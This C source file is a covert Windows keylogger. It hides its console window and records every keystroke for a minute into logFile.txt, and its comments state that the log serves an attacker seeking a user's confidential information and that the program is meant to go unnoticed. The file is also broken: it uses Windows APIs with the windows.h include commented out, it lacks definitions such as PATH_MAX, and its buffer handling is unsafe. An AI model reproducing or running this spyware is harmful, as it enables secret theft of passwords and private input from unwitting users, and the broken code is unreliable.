#include <stdio.h>
//#include <windows.h>
#include<sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stdbool.h>
#include<stdlib.h>
#include<string.h>
// #include <conio.h>
#include <signal.h>
#define DURATIONFORPROCESS 60.0     //Time period in seconds for which keystrokes has to be recorded.




int main()
{
	double diff_t;
	int key;

	char cwd[PATH_MAX]; //This cwd array is used to store the current working directory.
	char *fileName = "\\logFile.txt";  //Name of file where the text would be recorded.
	char *ptr;
	FILE *fp;


	/*
	1. Finding the current path.
	2. Concatinating the file to the path where the log will be stored.
	3. Opening the file in the append mode.
	*/
	if (getcwd(cwd, sizeof(cwd)) != NULL)
   	{

   	   	ptr = (char*)malloc(PATH_MAX+strlen(fileName));
   	   	ptr = strcat(cwd,fileName);
   	}
   	else
   	{
       perror("Can't find the path'");
       exit(0);
   	}

   	//Opening the file in append mode.

   	fp = fopen (ptr, "a+");

  	if(!fp)
  	{
  		printf("File does not exist")	;
  		exit(0);
	}


	// Get the current time. Each element of the time is stored in differnt variables.

  	time_t curtime;
  	time_t curtimeNew;
  	//struct tm * local;

  	time ( &curtime );



  	/*
  	1. These variables and functions are inbuilt functions which are declared in window.h.
  	2. These functions hides the console when the program executes.
  	*/

	HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);


	/*
    1. Running the infinite times.
    2. Here in this case terminating codition will be when the 1 minute is over automatically process terminates.
    3. Meanwhile in this minute whatever user types will be recored into the logFile.txt
    4. This file could be used by the malicious attacker to get the confidential information of the user.
    5. GetAsyncKeyState: This function returns value specifies whether the key was pressed since the last call to it, and whether the key is currently up or down.
    */
   	while(1)
	{
		Sleep(5);   // To make the other processes to run so that user won't be able to know whether something is running behind. Parameter in seconds

		/*
            1. These different cases for key pressed and store those key values into the log file.
            */

		if( GetAsyncKeyState( ' ' ) & 0x0001 )
		{
    		fprintf(fp," ");
		}

		if( GetAsyncKeyState( 0x09 ) & 0x0001 )
		{
    		fprintf(fp,"TAB\n");
		}
			if( GetAsyncKeyState( 0x0D ) & 0x0001 )
		{
    		fprintf(fp,"\n");
		}

		if( GetAsyncKeyState( 0x1B ) & 0x0001 )
		{
    		fprintf(fp,"ESC\n");
		}


		if( GetAsyncKeyState( 0x08 ) & 0x0001 )
		{
    		fprintf(fp,"BSPACE\n");
		}

        if( GetAsyncKeyState( '0' ) & 0x0001 )
		{
    		fprintf(fp,"0");
		}

		if( GetAsyncKeyState( '1' ) & 0x0001 )
		{
    		fprintf(fp,"1");
		}

		if( GetAsyncKeyState( '2' ) & 0x0001 )
		{
    		fprintf(fp,"2");
		}

		if( GetAsyncKeyState( '3' ) & 0x0001 )
		{
    		fprintf(fp,"3");
		}

		if( GetAsyncKeyState( '4' ) & 0x0001 )
		{
    		fprintf(fp,"4");
		}

		if( GetAsyncKeyState( '5' ) & 0x0001 )
		{
    		fprintf(fp,"5");
		}

		if( GetAsyncKeyState( '6' ) & 0x0001 )
		{
    		fprintf(fp,"6");
		}

		if( GetAsyncKeyState( '7' ) & 0x0001 )
		{
    		fprintf(fp,"7");
		}

		if( GetAsyncKeyState( '8' ) & 0x0001 )
		{
    		fprintf(fp,"8");
		}

		if( GetAsyncKeyState( '9' ) & 0x0001 )
		{
    		fprintf(fp,"9");
		}

		if( GetAsyncKeyState( '!' ) & 0x0001 )
		{
    		fprintf(fp,"!");
		}

		if( GetAsyncKeyState( '@' ) & 0x0001 )
		{
    		fprintf(fp,"@");
		}

		if( GetAsyncKeyState( '#' ) & 0x0001 )
		{
    		fprintf(fp,"#");
		}

		if( GetAsyncKeyState( '$' ) & 0x0001 )
		{
    		fprintf(fp,"$");
		}

		if( GetAsyncKeyState( '%' ) & 0x0001 )
		{
    		fprintf(fp,"%");
		}

		if( GetAsyncKeyState( '^' ) & 0x0001 )
		{
    		fprintf(fp,"^");
		}

		if( GetAsyncKeyState( '&' ) & 0x0001 )
		{
    		fprintf(fp,"&");
		}

		if( GetAsyncKeyState( '*' ) & 0x0001 )
		{
    		fprintf(fp,"*");
		}

		if( GetAsyncKeyState( '(' ) & 0x0001 )
		{
    		fprintf(fp,"(");
		}

		if( GetAsyncKeyState( ')' ) & 0x0001 )
		{
    		fprintf(fp,")");
		}

		if( GetAsyncKeyState( '<' ) & 0x0001 )
		{
    		fprintf(fp,"<");
		}

		if( GetAsyncKeyState( '>' ) & 0x0001 )
		{
    		fprintf(fp,">");
		}

        if( GetAsyncKeyState( 'A' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"A");
		}

		if( GetAsyncKeyState( 'B' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001))
		{
    		fprintf(fp,"B");
		}

		if( GetAsyncKeyState( 'C' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001))
		{
    		fprintf(fp,"C");
		}

		if( GetAsyncKeyState( 'D' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001))
		{
    		fprintf(fp,"D");
		}

		if( GetAsyncKeyState( 'E' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"E");
		}

		if( GetAsyncKeyState( 'F' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"F");
		}

		if( GetAsyncKeyState( 'G' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"G");
		}

		if( GetAsyncKeyState( 'H' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"H");
		}

		if( GetAsyncKeyState( 'I' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"I");
		}

		if( GetAsyncKeyState( 'J' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"J");
		}

		if( GetAsyncKeyState( 'K' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"K");
		}

		if( GetAsyncKeyState( 'L' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"L");
		}

		if( GetAsyncKeyState( 'M' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"M");
		}

		if( GetAsyncKeyState( 'N' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"N");
		}

		if( GetAsyncKeyState( 'O' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"O");
		}

		if( GetAsyncKeyState( 'P' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"P");
		}

		if( GetAsyncKeyState( 'Q' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001))
		{
			fprintf(fp,"Q");
		}

		if( GetAsyncKeyState( 'R' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"R");
		}

		if( GetAsyncKeyState( 'S' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"S");
		}

		if( GetAsyncKeyState( 'T' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"T");
		}

		if( GetAsyncKeyState( 'U' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"U");
		}

		if( GetAsyncKeyState( 'V' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"V");
		}

		if( GetAsyncKeyState( 'W' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"W");
		}

		if( GetAsyncKeyState( 'X' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001))
		{
    		fprintf(fp,"X");
		}

		if( GetAsyncKeyState( 'Y' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"Y");
		}

		if( GetAsyncKeyState( 'Z' ) & 0x0001 && (GetAsyncKeyState( VK_LSHIFT ) & 0x0001  || GetAsyncKeyState( VK_RSHIFT ) & 0x0001  || GetAsyncKeyState( VK_CAPITAL ) & 0x0001) )
		{
    		fprintf(fp,"Z");
		}

		if( GetAsyncKeyState( 'A' ) & 0x0001 )
		{
    		fprintf(fp,"a");
		}

		if( GetAsyncKeyState( 'B' ) & 0x0001 )
		{
    		fprintf(fp,"b");
		}

		if( GetAsyncKeyState( 'C' ) & 0x0001 )
		{
    		fprintf(fp,"c");
		}

		if( GetAsyncKeyState( 'D' ) & 0x0001 )
		{
    		fprintf(fp,"d");
		}

		if( GetAsyncKeyState( 'E' ) & 0x0001 )
		{
    		fprintf(fp,"e");
		}

		if( GetAsyncKeyState( 'F' ) & 0x0001 )
		{
    		fprintf(fp,"f");
		}

		if( GetAsyncKeyState( 'G' ) & 0x0001 )
		{
    		fprintf(fp,"g");
		}

		if( GetAsyncKeyState( 'H' ) & 0x0001 )
		{
    		fprintf(fp,"h");
		}

		if( GetAsyncKeyState( 'I' ) & 0x0001 )
		{
    		fprintf(fp,"i");
		}

		if( GetAsyncKeyState( 'J' ) & 0x0001 )
		{
    		fprintf(fp,"j");
		}

		if( GetAsyncKeyState( 'K' ) & 0x0001 )
		{
    		fprintf(fp,"k");
		}

		if( GetAsyncKeyState( 'L' ) & 0x0001 )
		{
    		fprintf(fp,"l");
		}

		if( GetAsyncKeyState( 'M' ) & 0x0001 )
		{
    		fprintf(fp,"m");
		}

		if( GetAsyncKeyState( 'N' ) & 0x0001 )
		{
    		fprintf(fp,"n");
		}

		if( GetAsyncKeyState( 'O' ) & 0x0001 )
		{
    		fprintf(fp,"o");
		}

		if( GetAsyncKeyState( 'P' ) & 0x0001 )
		{
    		fprintf(fp,"p");
		}

		if( GetAsyncKeyState( 'Q' ) & 0x0001 )
		{
			fprintf(fp,"q");
		}

		if( GetAsyncKeyState( 'R' ) & 0x0001 )
		{
    		fprintf(fp,"r");
		}

		if( GetAsyncKeyState( 'S' ) & 0x0001 )
		{
    		fprintf(fp,"s");
		}

		if( GetAsyncKeyState( 'T' ) & 0x0001 )
		{
    		fprintf(fp,"t");
		}

		if( GetAsyncKeyState( 'U' ) & 0x0001 )
		{
    		fprintf(fp,"u");
		}

		if( GetAsyncKeyState( 'V' ) & 0x0001 )
		{
    		fprintf(fp,"v");
		}

		if( GetAsyncKeyState( 'W' ) & 0x0001 )
		{
    		fprintf(fp,"w");
		}

		if( GetAsyncKeyState( 'X' ) & 0x0001 )
		{
    		fprintf(fp,"x");
		}

		if( GetAsyncKeyState( 'Y' ) & 0x0001 )
		{
    		fprintf(fp,"y");
		}

		if( GetAsyncKeyState( 'Z' ) & 0x0001 )
		{
    		fprintf(fp,"z");
		}



		time ( &curtimeNew );
        diff_t = difftime(curtimeNew, curtime);
  		if ( diff_t > DURATIONFORPROCESS )  // When the duration is over (defined constant) close the file and teminate the process.
		{
			break;
        }
	}
	fclose(fp);
	return 0;
}
